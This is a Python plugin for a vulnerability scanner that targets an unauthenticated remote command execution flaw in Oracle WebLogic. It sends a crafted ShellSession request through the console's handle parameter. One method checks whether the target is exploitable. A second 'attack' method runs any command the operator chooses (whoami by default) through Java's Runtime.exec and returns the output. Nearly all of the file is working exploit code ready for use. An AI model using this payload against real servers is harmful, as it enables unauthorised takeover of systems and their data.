# -*-* coding:UTF-8
import base64
import json


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "weblogic未授权命令执行漏洞",
        "datetime": "2022-01-12"
    }

    def url(self) -> dict:
        """ 验证方法 """
        random_str = self.build_random_str(12)
        r = self.request(
            method='get',
            path=f'?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('
                 f'"java.lang.Runtime.getRuntime().exec(\'{random_str}\');");',
            headers={
                "Host": self.target.value.split("//")[1],
                "cmd": "tasklist",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15
        )
        if r.status_code == 200 and random_str in r.text:
            return {
                'LoopholeInfo': {'app': "Weblogic"}
            }

    @cli.options('cmd', desc="执行命令", default="whoami")
    def attack(self, cmd):
        """ 利用方法 """
        r = self.request(
            method='get',
            path=f'?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('
                 f'"java.lang.Runtime.getRuntime().exec(\'{cmd}\');");',
            headers={
                "Host": self.target.value.split("//")[1],
                "cmd": "tasklist",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            timeout=15
        )
        if r.status_code == 200:
            if r.status_code == 200:
                return r.text
            else:
                return "failure"
